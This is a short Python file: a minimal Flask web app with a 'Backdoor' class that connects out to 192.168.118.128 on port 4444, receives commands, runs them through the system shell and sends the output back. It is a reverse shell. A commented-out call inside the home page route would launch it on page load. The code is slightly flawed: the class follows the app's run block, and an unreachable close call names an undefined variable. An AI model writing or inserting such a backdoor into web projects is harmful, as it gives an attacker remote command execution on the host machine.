import socket
import subprocess
import json

from flask import Flask, redirect, url_for, render_template

app = Flask(__name__)

@app.route("/")  # this sets the route to this page
def home():
    # new_backdoor = Backdoor("192.168.118.128", 4444)
    # new_backdoor.run()
    return render_template("index.html")


if __name__ == "__main__":
    app.run(port=5050, debug=True)


class Backdoor:
    def __init__(self, ip, port):
        # create pipeline connection
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def run(self):
        while True:
            # recieve data from victim machine
            command = self.connection.recv(2048)
            command_result = self.execute_system_command(command.decode('utf-8'))
            self.connection.send(command_result)
        connection.close()